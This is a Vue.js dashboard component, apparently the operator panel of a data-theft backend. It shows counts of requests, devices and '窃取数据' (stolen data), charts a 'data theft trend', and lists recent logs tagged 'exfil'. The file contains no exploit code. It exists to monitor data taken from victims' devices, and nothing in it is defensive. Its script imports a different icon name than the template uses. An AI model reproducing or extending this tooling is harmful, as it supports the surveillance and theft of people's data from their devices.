<template>
  <div class="dashboard">
    <el-row :gutter="20">
      <el-col :span="6">
        <el-card class="stat-card">
          <div class="stat-icon request">
            <el-icon><Document /></el-icon>
          </div>
          <div class="stat-info">
            <p class="stat-value">{{ stats.total_requests }}</p>
            <p class="stat-label">总请求数</p>
          </div>
        </el-card>
      </el-col>
      <el-col :span="6">
        <el-card class="stat-card">
          <div class="stat-icon device">
            <el-icon><Phone /></el-icon>
          </div>
          <div class="stat-info">
            <p class="stat-value">{{ stats.total_devices }}</p>
            <p class="stat-label">设备数</p>
          </div>
        </el-card>
      </el-col>
      <el-col :span="6">
        <el-card class="stat-card">
          <div class="stat-icon exfil">
            <el-icon><FolderOpen /></el-icon>
          </div>
          <div class="stat-info">
            <p class="stat-value">{{ stats.total_exfil }}</p>
            <p class="stat-label">窃取数据</p>
          </div>
        </el-card>
      </el-col>
      <el-col :span="6">
        <el-card class="stat-card">
          <div class="stat-icon today">
            <el-icon><Calendar /></el-icon>
          </div>
          <div class="stat-info">
            <p class="stat-value">{{ stats.today_requests }}</p>
            <p class="stat-label">今日请求</p>
          </div>
        </el-card>
      </el-col>
    </el-row>
    
    <el-row :gutter="20" style="margin-top: 20px;">
      <el-col :span="12">
        <el-card title="请求趋势">
          <div ref="requestChart" class="chart"></div>
        </el-card>
      </el-col>
      <el-col :span="12">
        <el-card title="数据窃取趋势">
          <div ref="exfilChart" class="chart"></div>
        </el-card>
      </el-col>
    </el-row>
    
    <el-row :gutter="20" style="margin-top: 20px;">
      <el-col :span="24">
        <el-card title="最近日志">
          <el-table :data="recentLogs" border>
            <el-table-column prop="timestamp" label="时间" width="180" />
            <el-table-column prop="ip" label="IP" width="150" />
            <el-table-column prop="method" label="方法" width="80" />
            <el-table-column prop="path" label="路径" />
            <el-table-column prop="log_type" label="类型" width="100">
              <template #default="scope">
                <el-tag :type="scope.row.log_type === 'exfil' ? 'danger' : 'info'">
                  {{ scope.row.log_type === 'exfil' ? '数据窃取' : '请求' }}
                </el-tag>
              </template>
            </el-table-column>
          </el-table>
        </el-card>
      </el-col>
    </el-row>
  </div>
</template>

<script setup>
import { ref, reactive, onMounted, nextTick } from 'vue'
import { Document, Phone, FolderOpened, Calendar } from '@element-plus/icons-vue'
import axios from '../utils/axios'
import * as echarts from 'echarts'

const stats = reactive({
  total_requests: 0,
  total_devices: 0,
  total_exfil: 0,
  today_requests: 0,
  today_exfil: 0,
  request_trend: [],
  exfil_trend: []
})

const recentLogs = ref([])
const requestChart = ref(null)
const exfilChart = ref(null)

async function loadStats() {
  try {
    const response = await axios.get('/api/logs/stats')
    Object.assign(stats, response.data)
  } catch (error) {
    console.error('加载统计数据失败:', error)
  }
}

async function loadRecentLogs() {
  try {
    const response = await axios.get('/api/logs?limit=10')
    recentLogs.value = response.data
  } catch (error) {
    console.error('加载日志失败:', error)
  }
}

function initCharts() {
  const days = []
  for (let i = 6; i >= 0; i--) {
    const date = new Date()
    date.setDate(date.getDate() - i)
    days.push(`${date.getMonth() + 1}/${date.getDate()}`)
  }
  
  if (requestChart.value) {
    const chart = echarts.init(requestChart.value)
    chart.setOption({
      xAxis: { type: 'category', data: days },
      yAxis: { type: 'value' },
      series: [{
        name: '请求数',
        type: 'line',
        data: stats.request_trend,
        smooth: true,
        itemStyle: { color: '#409eff' }
      }]
    })
  }
  
  if (exfilChart.value) {
    const chart = echarts.init(exfilChart.value)
    chart.setOption({
      xAxis: { type: 'category', data: days },
      yAxis: { type: 'value' },
      series: [{
        name: '数据窃取',
        type: 'line',
        data: stats.exfil_trend,
        smooth: true,
        itemStyle: { color: '#f56c6c' }
      }]
    })
  }
}

onMounted(async () => {
  await loadStats()
  await loadRecentLogs()
  nextTick(() => {
    initCharts()
  })
})
</script>

<style scoped>
.stat-card {
  display: flex;
  align-items: center;
  gap: 15px;
}

.stat-icon {
  width: 50px;
  height: 50px;
  border-radius: 8px;
  display: flex;
  justify-content: center;
  align-items: center;
  font-size: 24px;
}

.stat-icon.request { background: #e6f7ff; color: #409eff; }
.stat-icon.device { background: #f6ffed; color: #67c23a; }
.stat-icon.exfil { background: #fff7e6; color: #e6a23c; }
.stat-icon.today { background: #f9f0ff; color: #909399; }

.stat-info {
  flex: 1;
}

.stat-value {
  margin: 0;
  font-size: 24px;
  font-weight: bold;
  color: #303133;
}

.stat-label {
  margin: 5px 0 0;
  font-size: 14px;
  color: #909399;
}

.chart {
  height: 250px;
}
</style>
